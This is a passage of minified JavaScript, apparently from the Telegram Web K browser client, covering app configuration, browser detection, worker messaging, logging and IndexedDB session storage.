;(function () {
  const e = document.createElement("link").relList
  if (e && e.supports && e.supports("modulepreload")) return
  for (const i of document.querySelectorAll('link[rel="modulepreload"]')) r(i)
  new MutationObserver((i) => {
    for (const n of i)
      if (n.type === "childList")
        for (const o of n.addedNodes)
          o.tagName === "LINK" && o.rel === "modulepreload" && r(o)
  }).observe(document, { childList: !0, subtree: !0 })
  function s(i) {
    const n = {}
    return (
      i.integrity && (n.integrity = i.integrity),
      i.referrerPolicy && (n.referrerPolicy = i.referrerPolicy),
      i.crossOrigin === "use-credentials"
        ? (n.credentials = "include")
        : i.crossOrigin === "anonymous"
        ? (n.credentials = "omit")
        : (n.credentials = "same-origin"),
      n
    )
  }
  function r(i) {
    if (i.ep) return
    i.ep = !0
    const n = s(i)
    fetch(i.href, n)
  }
})()
const nr = "modulepreload",
  or = function (t, e) {
    return new URL(t, e).href
  },
  Ot = {},
  W = function (e, s, r) {
    if (!s || s.length === 0) return e()
    const i = document.getElementsByTagName("link")
    return Promise.all(
      s.map((n) => {
        if (((n = or(n, r)), n in Ot)) return
        Ot[n] = !0
        const o = n.endsWith(".css"),
          c = o ? '[rel="stylesheet"]' : ""
        if (!!r)
          for (let h = i.length - 1; h >= 0; h--) {
            const m = i[h]
            if (m.href === n && (!o || m.rel === "stylesheet")) return
          }
        else if (document.querySelector(`link[href="${n}"]${c}`)) return
        const u = document.createElement("link")
        if (
          ((u.rel = o ? "stylesheet" : nr),
          o || ((u.as = "script"), (u.crossOrigin = "")),
          (u.href = n),
          document.head.appendChild(u),
          o)
        )
          return new Promise((h, m) => {
            u.addEventListener("load", h),
              u.addEventListener("error", () =>
                m(new Error(`Unable to preload CSS for ${n}`))
              )
          })
      })
    ).then(() => e())
  },
  Bt = ["web.telegram.org", "webk.telegram.org"],
  xt = Math.min(4, navigator.hardwareConcurrency ?? 4),
  B = {
    id: +"1025907",
    hash: "452b0359b988148995f22ff0f4229750",
    version: "1.9.7",
    versionFull: "1.9.7 (444)",
    build: +"444",
    langPackVersion: "3.5.0",
    langPack: "webk",
    langPackCode: "en",
    domains: Bt,
    baseDcId: 2,
    isMainDomain: Bt.includes(location.hostname),
    suffix: "K",
    threads: xt,
    cryptoWorkers: xt,
  }
B.isMainDomain && ((B.id = 2496), (B.hash = "8da85b0d5bfe62527e5b244c209159c3"))
function Nt() {
  return document.activeElement?.blur ? (document.activeElement.blur(), !0) : !1
}
function Wt(t) {
  if ((t || (t = window.event), t)) {
    t = t.originalEvent || t
    try {
      t.stopPropagation && t.stopPropagation(),
        t.preventDefault && t.preventDefault(),
        (t.returnValue = !1),
        (t.cancelBubble = !0)
    } catch {}
  }
  return !1
}
const ee =
    "ontouchstart" in window ||
    (window.DocumentTouch && document instanceof DocumentTouch),
  St = typeof window < "u" ? window : self,
  Fe = navigator ? navigator.userAgent : null,
  ct = navigator.userAgent.search(/OS X|iPhone|iPad|iOS/i) !== -1,
  cs = navigator.userAgent.toLowerCase().indexOf("android") !== -1,
  ar =
    /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor),
  cr = (() => {
    try {
      return +navigator.userAgent.match(/Chrom(?:e|ium)\/(.+?)(?:\s|\.)/)[1]
    } catch {}
  })(),
  ue =
    (/iPad|iPhone|iPod/.test(navigator.platform) ||
      (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1)) &&
    !St.MSStream,
  $ =
    "safari" in St ||
    !!(
      Fe &&
      (/\b(iPad|iPhone|iPod)\b/.test(Fe) ||
        (Fe.match("Safari") && !Fe.match("Chrome")))
    ),
  le = navigator.userAgent.toLowerCase().indexOf("firefox") > -1,
  us = $ && ue,
  he =
    (navigator.maxTouchPoints === void 0 || navigator.maxTouchPoints > 0) &&
    navigator.userAgent.search(
      /iOS|iPhone OS|Android|BlackBerry|BB10|Series ?[64]0|J2ME|MIDP|opera mini|opera mobi|mobi.+Gecko|Windows Phone/i
    ) != -1,
  ur = Object.freeze(
    Object.defineProperty(
      {
        __proto__: null,
        CHROMIUM_VERSION: cr,
        IS_ANDROID: cs,
        IS_APPLE: ct,
        IS_APPLE_MOBILE: ue,
        IS_CHROMIUM: ar,
        IS_FIREFOX: le,
        IS_MOBILE: he,
        IS_MOBILE_SAFARI: us,
        IS_SAFARI: $,
        USER_AGENT: Fe,
      },
      Symbol.toStringTag,
      { value: "Module" }
    )
  )
function lr(t, e) {
  return t.closest("." + e)
}
let ge
function ut(t) {
  ge
    ? ge.push(t)
    : ((ge = [t]),
      requestAnimationFrame(() => {
        const e = ge
        ;(ge = void 0), e.forEach((s) => s())
      }))
}
let ae
function Gn() {
  return (
    ae ||
    ((ae = new Promise((t) => ut(() => t()))),
    ae.then(() => {
      ae = void 0
    }),
    ae)
  )
}
function hr() {
  return new Promise((t) => {
    ut(() => {
      ut(t)
    })
  })
}
function Ut(t) {
  ;(t.style.transform = "translateY(-99999px)"),
    t.focus(),
    hr().then(() => {
      t.style.transform = ""
    })
}
const lt = $ && he && ee && !1
if (lt) {
  const t = "clientY"
  let e = 0
  const s = { capture: !0, passive: !1 },
    r = (n) => {
      const o = n.touches[0],
        c = lr(o.target, "scrollable-y")
      if (c) {
        const a = o[t],
          u = e - a,
          h = c.scrollTop,
          m = c.scrollHeight,
          v = c.clientHeight,
          D = h ? Math.round(h + c.clientHeight + u) : h + u
        ;(m === v || D >= m || D <= 0) && n.preventDefault()
      } else n.preventDefault()
    }
  let i = 0
  document.addEventListener(
    "focusin",
    (n) => {
      !n.target.classList.contains("is-sticky-input-bugged") ||
        n.timeStamp - i < 50 ||
        (Ut(n.target),
        document.addEventListener("touchmove", r, s),
        document.addEventListener("touchstart", (o) => {
          if (o.touches.length > 1) return
          e = o.touches[0][t]
        }))
    },
    { passive: !0 }
  ),
    document.addEventListener(
      "focusout",
      (n) => {
        document.removeEventListener("touchmove", r, s), (i = n.timeStamp)
      },
      { passive: !0 }
    ),
    document.addEventListener(
      "visibilitychange",
      () => {
        document.activeElement &&
          document.activeElement.classList.contains("is-sticky-input-bugged") &&
          document.activeElement.blur &&
          Ut(document.activeElement)
      },
      { passive: !0 }
    )
}
const ht = navigator.userAgent.search(/OS X|iPhone|iPad|iOS/i) !== -1
function ls(t) {
  return new Promise((e) => {
    setTimeout(e, t)
  })
}
function hs(t) {
  return (
    t instanceof URL || (t = new URL(t + "", location.href)),
    location.search &&
      t.protocol !== "blob:" &&
      new URLSearchParams(location.search).forEach((s, r) => {
        t.searchParams.set(r, s)
      }),
    t.searchParams.delete("swfix"),
    t
  )
}
function dr() {
  const t = {
    construct(e, s) {
      return (s[0] = hs(s[0])), new e(...s)
    },
  }
  ;[Worker, typeof SharedWorker < "u" && SharedWorker]
    .filter(Boolean)
    .forEach((e) => {
      window[e.name] = new Proxy(e, t)
    })
}
dr()
function fr() {
  Element.prototype.toggleAttribute ||
    (Element.prototype.toggleAttribute = function (t, e) {
      return (
        e !== void 0 && (e = !!e),
        this.hasAttribute(t)
          ? e
            ? !0
            : (this.removeAttribute(t), !1)
          : e === !1
          ? !1
          : (this.setAttribute(t, ""), !0)
      )
    })
}
const ds = 0,
  gr = "",
  dt = 4294967296,
  Dr = new Set(["web", "k", "z", "a"]),
  mr = 0,
  pr = 1,
  Fr = new Set([mr, pr])
Math.max(...Array.from(Fr)) + 1
function Er(t, e) {
  const s = t.findIndex(e)
  return s !== -1 ? t.splice(s, 1)[0] : void 0
}
class ne {
  constructor(e) {
    this._constructor(e)
  }
  _constructor(e) {
    ;(this.reuseResults = e), (this.listeners = {}), (this.listenerResults = {})
  }
  addEventListener(e, s, r) {
    var i
    if (
      (((i = this.listeners)[e] ?? (i[e] = [])).push({
        callback: s,
        options: r,
      }),
      this.listenerResults.hasOwnProperty(e) &&
        (s(...this.listenerResults[e]), r?.once))
    ) {
      this.listeners[e].pop()
      return
    }
  }
  addMultipleEventsListeners(e) {
    for (const s in e) this.addEventListener(s, e[s])
  }
  removeEventListener(e, s, r) {
    this.listeners[e] && Er(this.listeners[e], (i) => i.callback === s)
  }
  invokeListenerCallback(e, s, ...r) {
    let i, n
    try {
      i = s.callback(...r)
    } catch (o) {
      n = o
    }
    if ((s.options?.once && this.removeEventListener(e, s.callback), n)) throw n
    return i
  }
  _dispatchEvent(e, s, ...r) {
    this.reuseResults && (this.listenerResults[e] = r)
    const i = s && [],
      n = this.listeners[e]
    return (
      n &&
        n.slice().forEach((c) => {
          if (n.findIndex((h) => h.callback === c.callback) === -1) return
          const u = this.invokeListenerCallback(e, c, ...r)
          i && i.push(u)
        }),
      i
    )
  }
  dispatchResultableEvent(e, ...s) {
    return this._dispatchEvent(e, !0, ...s)
  }
  dispatchEvent(e, ...s) {
    this._dispatchEvent(e, !1, ...s)
  }
  cleanup() {
    ;(this.listeners = {}), (this.listenerResults = {})
  }
}
const Y = {
  test: location.search.indexOf("test=1") > 0,
  debug: location.search.indexOf("debug=1") > 0,
  http: !1,
  ssl: !0,
  multipleConnections: !0,
  asServiceWorker: !1,
  transport: "websocket",
  noSharedWorker: location.search.indexOf("noSharedWorker=1") > 0,
}
Y.http = location.search.indexOf("http=1") > 0
Y.http = !0
Y.http && (Y.transport = "https")
const vr = !1,
  se = Y.debug,
  yr = typeof window < "u" ? window : self,
  S = yr,
  fs = ((Date.now() % Math.random()) * 1e8) | 0
function Qe(t, e) {
  const s = t.indexOf(e)
  return (s === -1 ? void 0 : t.splice(s, 1))?.[0]
}
const Se =
    typeof ServiceWorkerGlobalScope < "u" &&
    self instanceof ServiceWorkerGlobalScope,
  Ge =
    typeof WorkerGlobalScope < "u" && self instanceof WorkerGlobalScope && !Se,
  re = Ge || Se,
  Sr = () => self.clients.matchAll({ includeUncontrolled: !1, type: "window" }),
  gs = (t, ...e) => {
    try {
      t.postMessage(...e)
    } catch (s) {
      console.error("[worker] postMessage error:", s, e)
    }
  },
  Ds = (t, ...e) => {
    Sr().then((s) => {
      s.length &&
        s.slice(t ? 0 : -1).forEach((r) => {
          gs(r, ...e)
        })
    })
  },
  ms = (...t) => {
    gs(self, ...t)
  },
  ps = () => {}
Se && Ds.bind(null, !1)
Se && Ds.bind(null, !0)
const et = {}
function Be(t) {
  return et[t] ?? (et[t] = { type: t })
}
const _r = Date.now()
function xe() {
  return "[" + ((Date.now() - _r) / 1e3).toFixed(3) + "]"
}
var _t = ((t) => (
  (t[(t.None = 0)] = "None"),
  (t[(t.Error = 1)] = "Error"),
  (t[(t.Warn = 2)] = "Warn"),
  (t[(t.Log = 4)] = "Log"),
  (t[(t.Debug = 8)] = "Debug"),
  t
))(_t || {})
const wr = [0, 1, 2, 4, 8],
  kr = $ || le,
  Cr = !kr,
  Vt = {
    reset: "\x1B[0m",
    bright: "\x1B[1m",
    dim: "\x1B[2m",
    underscore: "\x1B[4m",
    blink: "\x1B[5m",
    reverse: "\x1B[7m",
    hidden: "\x1B[8m",
    fg: {
      black: "\x1B[30m",
      red: "\x1B[31m",
      green: "\x1B[32m",
      yellow: "\x1B[33m",
      blue: "\x1B[34m",
      magenta: "\x1B[35m",
      cyan: "\x1B[36m",
      white: "\x1B[37m",
    },
    bg: {
      black: "\x1B[40m",
      red: "\x1B[41m",
      green: "\x1B[42m",
      yellow: "\x1B[43m",
      blue: "\x1B[44m",
      magenta: "\x1B[45m",
      cyan: "\x1B[46m",
      white: "\x1B[47m",
    },
  },
  br = [
    ["debug", 8],
    ["info", 4],
    ["warn", 2],
    ["error", 1],
    ["assert", 1],
    ["trace", 4],
    ["group", 4],
    ["groupCollapsed", 4],
    ["groupEnd", 4],
  ]
function K(t, e = 7, s = !1, r = "") {
  let i
  !se && !s && (e = 1),
    Cr ? r || (Se ? (r = Vt.fg.yellow) : Ge && (r = Vt.fg.cyan)) : (r = "")
  const n = r
  r ? (r = `%s ${r}%s`) : (r = "%s")
  const o = function (...c) {
    return e & 4 && console.log(r, xe(), t, ...c)
  }
  return (
    br.forEach(([c, a]) => {
      o[c] = function (...u) {
        return e & a && console[c](r, xe(), t, ...u)
      }
    }),
    (o.setPrefix = function (c) {
      ;(i = c), (t = "[" + c + "]")
    }),
    o.setPrefix(t),
    (o.setLevel = function (c) {
      e = wr.slice(0, c + 1).reduce((a, u) => a | u, 0)
    }),
    (o.bindPrefix = function (c, a = e) {
      return K(`${i}] [${c}`, a, s, n)
    }),
    o
  )
}
const Pr = !0
class wt extends ne {
  constructor(e) {
    super(!1),
      (this.logSuffix = e),
      (this.onMessage = (s) => {
        const r = s.data,
          i = s.source || s.currentTarget
        this.processTaskMap[r.type](r, i, s)
      }),
      (this.processResultTask = (s) => {
        const { taskId: r, result: i, error: n } = s.payload,
          o = this.awaiting[r]
        o &&
          (this.debug && this.log.debug("done", o.taskType, i, n),
          "error" in s.payload ? o.reject(n) : o.resolve(i),
          delete this.awaiting[r])
      }),
      (this.processAckTask = (s) => {
        const r = s.payload,
          i = this.awaiting[r.taskId]
        if (!i) return
        const n = i.resolve,
          o = {
            cached: r.cached,
            result: r.cached
              ? "result" in r
                ? Promise.resolve(r.result)
                : Promise.reject(r.error)
              : new Promise((c, a) => {
                  ;(i.resolve = c), (i.reject = a)
                }),
          }
        n(o), r.cached && delete this.awaiting[r.taskId]
      }),
      (this.processPingTask = (s, r, i) => {
        this.pushTask(this.createTask("pong", void 0), i.source)
      }),
      (this.processPongTask = (s, r, i) => {
        const n = this.pingResolves.get(r)
        n && (this.pingResolves.delete(r), n())
      }),
      (this.processCloseTask = (s, r, i) => {
        this.detachPort(r)
      }),
      (this.processBatchTask = (s, r, i) => {
        const n = {
          data: i.data,
          source: i.source,
          currentTarget: i.currentTarget,
        }
        s.payload.forEach((o) => {
          ;(n.data = o), this.onMessage(n)
        })
      }),
      (this.processLockTask = (s, r, i) => {
        const n = s.payload
        this.requestedLocks.has(n) ||
          (this.requestedLocks.set(n, r),
          navigator.locks.request(n, () => {
            this.processCloseTask(void 0, r, void 0),
              this.requestedLocks.delete(n)
          }))
      }),
      (this.processInvokeTask = async (s, r, i) => {
        const n = s.id,
          o = s.payload
        let c, a, u
        o.void || ((c = { taskId: n }), (a = this.createTask("result", c))),
          o.withAck && (u = this.createTask("ack", { taskId: n, cached: !0 }))
        let h
        try {
          const m = this.listeners[o.type]
          if (!m?.length) throw new Error("no listener")
          const v = m[0]
          let D = this.invokeListenerCallback(o.type, v, o.payload, r, i)
          if (o.void) return
          if (((h = D instanceof Promise), u)) {
            const w = !h
            if (
              ((u.payload.cached = w),
              w && (u.payload.result = D),
              this.pushTask(u, r),
              w)
            )
              return
          }
          h && (D = await D), (c.result = D)
        } catch (m) {
          if ((this.log.error("worker task error:", m, s), o.void)) return
          if (u && u.payload.cached) {
            ;(u.payload.error = m), this.pushTask(u, r)
            return
          }
          c.error = m
        }
        this.pushTask(a, r)
      }),
      (this.listenPorts = []),
      (this.sendPorts = []),
      (this.pingResolves = new Map()),
      (this.taskId = 0),
      (this.awaiting = {}),
      (this.pending = new Map()),
      (this.log = K("MP" + (e ? "-" + e : ""))),
      (this.debug = se),
      (this.heldLocks = new Map()),
      (this.requestedLocks = new Map()),
      (this.processTaskMap = {
        result: this.processResultTask,
        ack: this.processAckTask,
        invoke: this.processInvokeTask,
        ping: this.processPingTask,
        pong: this.processPongTask,
        close: this.processCloseTask,
        lock: this.processLockTask,
        batch: this.processBatchTask,
      })
  }
  setOnPortDisconnect(e) {
    this.onPortDisconnect = e
  }
  attachPort(e) {
    this.attachListenPort(e), this.attachSendPort(e)
  }
  attachListenPort(e) {
    this.listenPorts.push(e), e.addEventListener("message", this.onMessage)
  }
  attachSendPort(e) {
    if (
      (this.log.warn("attaching send port"),
      e.start?.(),
      this.sendPorts.push(e),
      typeof window < "u" && Pr)
    )
      if ("locks" in navigator) {
        const s = [
          "lock",
          fs,
          this.logSuffix || "",
          (Math.random() * 2147483647) | 0,
        ].join("-")
        this.log.warn("created lock", s)
        const r = new Promise((i) =>
          this.heldLocks.set(e, { resolve: i, id: s })
        ).then(() => this.heldLocks.delete(e))
        navigator.locks.request(s, () => (this.resendLockTask(e), r))
      } else
        window.addEventListener("beforeunload", () => {
          const s = this.createTask("close", void 0)
          this.postMessage(void 0, s)
        })
    this.releasePending()
  }
  resendLockTask(e) {
    const s = this.heldLocks.get(e)
    s && this.pushTask(this.createTask("lock", s.id), e)
  }
  detachPort(e) {
    this.log.warn("disconnecting port"),
      Qe(this.listenPorts, e),
      Qe(this.sendPorts, e),
      e.removeEventListener?.("message", this.onMessage),
      e.close?.(),
      this.onPortDisconnect?.(e),
      this.heldLocks.get(e)?.resolve()
    const r = Be("PORT_DISCONNECTED")
    for (const i in this.awaiting) {
      const n = this.awaiting[i]
      n.port === e && (n.reject(r), delete this.awaiting[i])
    }
  }
  postMessage(e, s) {
    ;(Array.isArray(e) ? e : e ? [e] : this.sendPorts).forEach((i) => {
      i.postMessage(s, s.transfer)
    })
  }
  async releasePending() {
    this.releasingPending ||
      ((this.releasingPending = !0),
      await Promise.resolve(),
      this.debug &&
        this.log.debug("releasing tasks, length:", this.pending.size),
      this.pending.forEach((e, s) => {
        let r = e
        {
          let n
          ;(r = []),
            e.forEach((o) => {
              o.transfer
                ? ((n = void 0), r.push(o))
                : (n || ((n = this.createTask("batch", [])), r.push(n)),
                  n.payload.push(o))
            })
        }
        const i = s ? [s] : this.sendPorts
        i.length &&
          (r.forEach((n) => {
            try {
              this.postMessage(i, n)
            } catch (o) {
              this.log.error("postMessage error:", o, n, i)
            }
          }),
          this.pending.delete(s))
      }),
      this.debug && this.log.debug("released tasks"),
      (this.releasingPending = !1))
  }
  createTask(e, s, r) {
    return { type: e, payload: s, id: this.taskId++, transfer: r }
  }
  createInvokeTask(e, s, r, i, n) {
    return this.createTask(
      "invoke",
      { type: e, payload: s, withAck: r, void: i },
      n
    )
  }
  pushTask(e, s) {
    let r = this.pending.get(s)
    r || this.pending.set(s, (r = [])), r.push(e), this.releasePending()
  }
  invokeVoid(e, s, r, i) {
    const n = this.createInvokeTask(e, s, void 0, !0, i)
    this.pushTask(n, r)
  }
  invoke(e, s, r, i, n) {
    this.debug && this.log.debug("start", e, s)
    let o
    const c = new Promise((a, u) => {
      ;(o = this.createInvokeTask(e, s, r, void 0, n)),
        (this.awaiting[o.id] = { resolve: a, reject: u, taskType: e, port: i }),
        this.pushTask(o, i)
    })
    if (re) {
      c.finally(() => {
        clearInterval(a)
      })
      const a = St.setInterval(() => {
        this.log.error("task still has no result", o, i)
      }, 6e4)
    }
    return c
  }
  invokeExceptSource(e, s, r) {
    const i = this.sendPorts.slice()
    Qe(i, r),
      i.forEach((n) => {
        this.invokeVoid(e, s, n)
      })
  }
}
class _e extends wt {
  constructor() {
    super("MTPROTO"), (_e.INSTANCE = this), S && (S.mtprotoMessagePort = this)
  }
  static getInstance() {
    return this.INSTANCE
  }
}
class Tr extends ne {
  constructor() {
    super(),
      (this.myId = ds),
      (this.connectionStatus = {}),
      (this.premium = !1),
      this.addEventListener("user_auth", ({ id: e }) => {
        this.myId = e.toPeerId()
      }),
      this.addEventListener(
        "premium_toggle_private",
        ({ isNew: e, isPremium: s }) => {
          ;(this.premium = s), this.dispatchEventSingle("premium_toggle", s)
        }
      ),
      this.addEventListener("connection_status_change", (e) => {
        this.connectionStatus[e.name] = e
      }),
      (this.dispatchEvent = (e, ...s) => {
        super.dispatchEvent(e, ...s),
          _e.getInstance().invokeVoid("event", { name: e, args: s })
      }),
      re ||
        this.addEventListener("settings_updated", ({ settings: e }) => {
          this.settings = e
        })
  }
  getConnectionStatus() {
    return this.connectionStatus
  }
  getPremium() {
    return this.premium
  }
  dispatchEventSingle(...e) {
    super.dispatchEvent(...e)
  }
}
const F = new Tr()
S.rootScope = F
function ft() {}
const Ar = {
  isFulfilled: !1,
  isRejected: !1,
  notify: () => {},
  notifyAll: function (...t) {
    ;(this.lastNotify = t), this.listeners?.forEach((e) => e(...t))
  },
  addNotifyListener: function (t) {
    this.lastNotify && t(...this.lastNotify),
      (this.listeners ?? (this.listeners = [])).push(t)
  },
  resolve: function (t) {
    this.isFulfilled ||
      this.isRejected ||
      ((this.isFulfilled = !0), this._resolve(t), this.onFinish())
  },
  reject: function (...t) {
    this.isRejected ||
      this.isFulfilled ||
      ((this.isRejected = !0), this._reject(...t), this.onFinish())
  },
  onFinish: function () {
    ;(this.notify = this.notifyAll = this.lastNotify = null),
      this.listeners && (this.listeners.length = 0),
      this.cancel && (this.cancel = ft)
  },
}
function q() {
  let t, e
  const s = new Promise((r, i) => {
    ;(t = r), (e = i)
  })
  return Object.assign(s, Ar), (s._resolve = t), (s._reject = e), s
}
self.deferredPromise = q
function tt(t, e, s = !0) {
  let r = null,
    i,
    n
  const o = () => {
      clearInterval(r), (r = null)
    },
    c = (...a) => {
      ;(i = !0),
        (n = a),
        r ||
          (s && ((i = !1), t(...n)),
          (r = setInterval(() => {
            if (!i) {
              o()
              return
            }
            ;(i = !1), t(...n)
          }, e)))
    }
  return (c.clear = o), c
}
function gt(t, e) {
  if (e) for (const s in e) e[s] !== void 0 && (t[s] = e[s])
  return t
}
const Dt = class {
  constructor(t) {
    gt(this, t),
      Y.test && (this.name += "_test"),
      (this.storageIsAvailable = !0),
      (this.log = K(["IDB", t.name].join("-"))),
      this.log("constructor"),
      this.openDatabase(!0),
      Dt.INSTANCES.push(this)
  }
  isAvailable() {
    return this.storageIsAvailable
  }
  openDatabase(t = !1) {
    if (this.openDbPromise && !t) return this.openDbPromise
    const e = (n, o) => {
        const c = Array.from(n.indexNames)
        for (const a of c) n.deleteIndex(a)
        if (o.indexes?.length)
          for (const a of o.indexes)
            n.indexNames.contains(a.indexName) ||
              n.createIndex(a.indexName, a.keyPath, a.objectParameters)
      },
      s = (n, o) => {
        const c = n.createObjectStore(o.name)
        e(c, o)
      }
    try {
      var r = indexedDB.open(this.name, this.version)
      if (!r) return Promise.reject()
    } catch (n) {
      return (
        this.log.error("error opening db", n.message),
        (this.storageIsAvailable = !1),
        Promise.reject(n)
      )
    }
    let i = !1
    return (
      setTimeout(() => {
        i || r.onerror(Be("IDB_CREATE_TIMEOUT"))
      }, 3e3),
      (this.openDbPromise = new Promise((n, o) => {
        ;(r.onsuccess = (c) => {
          i = !0
          const a = r.result
          let u = !1
          this.log("Opened"),
            (a.onerror = (h) => {
              ;(this.storageIsAvailable = !1),
                this.log.error(
                  "Error creating/accessing IndexedDB database",
                  h
                ),
                o(h)
            }),
            (a.onclose = (h) => {
              this.log.error("closed:", h), !u && this.openDatabase()
            }),
            (a.onabort = (h) => {
              this.log.error("abort:", h)
              const m = h.target
              this.openDatabase((u = !0)), m.onerror && m.onerror(h), a.close()
            }),
            (a.onversionchange = (h) => {
              this.log.error("onversionchange, lol?")
            }),
            n((this.db = a))
        }),
          (r.onerror = (c) => {
            ;(i = !0),
              (this.storageIsAvailable = !1),
              this.log.error("Error creating/accessing IndexedDB database", c),
              o(c)
          }),
          (r.onupgradeneeded = (c) => {
            ;(i = !0),
              this.log.warn(
                "performing idb upgrade from",
                c.oldVersion,
                "to",
                c.newVersion
              )
            const a = c.target,
              u = a.result
            this.stores.forEach((h) => {
              if (!u.objectStoreNames.contains(h.name)) s(u, h)
              else {
                const v = a.transaction.objectStore(h.name)
                e(v, h)
              }
            })
          })
      }))
    )
  }
  static create(t) {
    return this.INSTANCES.find((e) => e.name === t.name) ?? new Dt(t)
  }
  static closeDatabases(t) {
    this.INSTANCES.forEach((e) => {
      if (t && t === e) return
      const s = e.db
      s && ((s.onclose = () => {}), s.close())
    })
  }
}
let Fs = Dt
Fs.INSTANCES = []
class Lr {
  constructor(e, s) {
    ;(this.storeName = s),
      (this.log = K(["IDB", e.name, s].join("-"))),
      (this.idb = Fs.create(e))
  }
  delete(e, s) {
    const r = Array.isArray(e)
    return (
      r || (e = [].concat(e)),
      this.getObjectStore(
        "readwrite",
        (i) => {
          const n = e.map((o) => i.delete(o))
          return r ? n : n[0]
        },
        "",
        s
      )
    )
  }
  clear(e) {
    return this.getObjectStore("readwrite", (s) => s.clear(), "", e)
  }
  save(e, s, r) {
    const i = Array.isArray(e)
    return (
      i || ((e = [].concat(e)), (s = [].concat(s))),
      this.getObjectStore(
        "readwrite",
        (n) => {
          const o = e.map((c, a) => n.put(s[a], c))
          return i ? o : o[0]
        },
        "",
        r
      )
    )
  }
  get(e, s) {
    const r = Array.isArray(e)
    if (r) {
      if (!e.length) return Promise.resolve([])
    } else {
      if (!e) return
      e = [].concat(e)
    }
    return this.getObjectStore(
      "readonly",
      (i) => {
        const n = e.map((o) => i.get(o))
        return r ? n : n[0]
      },
      "",
      s
    )
  }
  getObjectStore(e, s, r, i = this.storeName) {
    let n
    return (
      r && ((n = performance.now()), this.log(r + ": start")),
      this.idb.openDatabase().then(
        (o) =>
          new Promise((c, a) => {
            const u = o.transaction([i], e),
              h = () => {
                clearTimeout(D), a(u.error)
              },
              m = () => {
                clearTimeout(D),
                  r && this.log(r + ": end", performance.now() - n)
                const T = g.map((L) => L.result)
                c(b ? T : T[0])
              }
            u.onerror = h
            const v = e === "readwrite"
            v && (u.oncomplete = () => m())
            const D = setTimeout(() => {
                this.log.error("transaction not finished", u, r)
              }, 1e4),
              w = s(u.objectStore(i)),
              b = Array.isArray(w),
              g = b ? w : [].concat(w)
            if (v) return
            const E = g.length
            let k = E
            const P = () => {
              u.error || --k || m()
            }
            for (let T = 0; T < E; ++T) {
              const L = g[T]
              ;(L.onerror = h), (L.onsuccess = P)
            }
          })
      )
    )
  }
  getAll(e) {
    return this.getObjectStore("readonly", (s) => s.getAll(), "", e)
  }
}
function zt() {}
const st = 16,
  Ae = class {
    constructor(t, e) {
      ;(this.db = t),
        (this.storeName = e),
        (this.cache = {}),
        (this.getPromises = new Map()),
        (this.keysToSet = new Set()),
        (this.saveDeferred = q()),
        (this.keysToDelete = new Set()),
        (this.deleteDeferred = q()),
        (this.storage = new Lr(t, e)),
        Ae.STORAGES.length
          ? (this.useStorage = Ae.STORAGES[0].useStorage)
          : (this.useStorage = !0),
        (this.savingFreezed = !1),
        Ae.STORAGES.push(this),
        (this.saveThrottled = tt(
          async () => {
            const s = this.saveDeferred
            this.saveDeferred = q()
            const r = this.keysToSet
            if (r.size) {
              const i = Array.from(r.values())
              r.clear()
              const n = i.map((o) => this.cache[o])
              try {
                await this.storage.save(i, n)
              } catch (o) {
                console.error("[AS]: set error:", o, i, n)
              }
            }
            s.resolve(), r.size && this.saveThrottled()
          },
          st,
          !1
        )),
        (this.deleteThrottled = tt(
          async () => {
            const s = this.deleteDeferred
            this.deleteDeferred = q()
            const r = this.keysToDelete
            if (r.size) {
              const i = Array.from(r.values())
              r.clear()
              try {
                await this.storage.delete(i)
              } catch (n) {
                console.error("[AS]: delete error:", n, i)
              }
            }
            s.resolve(), r.size && this.deleteThrottled()
          },
          st,
          !1
        )),
        (this.getThrottled = tt(
          async () => {
            const s = Array.from(this.getPromises.keys())
            this.storage
              .get(s)
              .then(
                (r) => {
                  for (let i = 0, n = s.length; i < n; ++i) {
                    const o = s[i],
                      c = this.getPromises.get(o)
                    c &&
                      (c.resolve((this.cache[o] = r[i])),
                      this.getPromises.delete(o))
                  }
                },
                (r) => {
                  new Set(["NO_ENTRY_FOUND", "STORAGE_OFFLINE"]).has(r.type) ||
                    ((this.useStorage = !1),
                    console.error("[AS]: get error:", r, s, e))
                  for (let n = 0, o = s.length; n < o; ++n) {
                    const c = s[n],
                      a = this.getPromises.get(c)
                    a && (a.resolve(void 0), this.getPromises.delete(c))
                  }
                }
              )
              .finally(() => {
                this.getPromises.size && this.getThrottled()
              })
          },
          st,
          !1
        ))
    }
    isAvailable() {
      return this.useStorage
    }
    getCache() {
      return this.cache
    }
    getFromCache(t) {
      return this.cache[t]
    }
    setToCache(t, e) {
      return (this.cache[t] = e)
    }
    async get(t, e = !0) {
      if (this.cache.hasOwnProperty(t) && e) return this.getFromCache(t)
      if (this.useStorage) {
        const s = this.getPromises.get(t)
        if (s) return s
        const r = q()
        return this.getPromises.set(t, r), this.getThrottled(), r
      }
    }
    getAll() {
      return this.storage.getAll().catch(() => [])
    }
    set(t, e = !1) {
      const s = this.useStorage && !e && !this.savingFreezed
      for (const r in t)
        if (t.hasOwnProperty(r)) {
          const i = t[r]
          this.setToCache(r, i),
            s &&
              (this.keysToSet.add(r),
              this.keysToDelete.delete(r),
              this.saveThrottled())
        }
      return s ? this.saveDeferred : Promise.resolve()
    }
    delete(t, e = !1) {
      return (
        (t = "" + t),
        e || delete this.cache[t],
        this.useStorage &&
          (this.keysToSet.delete(t),
          this.keysToDelete.add(t),
          this.deleteThrottled()),
        this.useStorage ? this.deleteDeferred : Promise.resolve()
      )
    }
    clear(t = !1) {
      if (!t) for (const e in this.cache) delete this.cache[e]
      return this.storage.clear().catch(zt)
    }
    static toggleStorage(t, e) {
      return Promise.all(
        this.STORAGES.map((s) => {
          if (((s.useStorage = t), !(!re || !e)))
            return t
              ? s.set(s.cache)
              : (s.keysToSet.clear(),
                s.keysToDelete.clear(),
                s.getPromises.forEach((r) => r.resolve(void 0)),
                s.getPromises.clear(),
                s.clear(!0))
        })
      ).catch(zt)
    }
    static freezeSaving(t, e) {
      this.STORAGES.forEach((s) => (s.savingFreezed = !0))
      try {
        t()
      } catch (s) {
        console.error("freezeSaving callback error:", s)
      }
      this.STORAGES.forEach((s) => (s.savingFreezed = !1))
    }
  }
let Ye = Ae
Ye.STORAGES = []
S && (S.AppStorage = Ye)
const Mr = {
  name: "tweb",
  version: 7,
  stores: [
    { name: "session" },
    { name: "stickerSets" },
    { name: "users" },
    { name: "chats" },
    { name: "dialogs" },
    { name: "messages" },
  ],
}
class Ir extends Ye {
  constructor() {
    super(Mr, "session")
  }
}
const ce = new Ir()
S.stateStorage = ce
function Es(t, e, s) {
  const r = s && new Set(s),
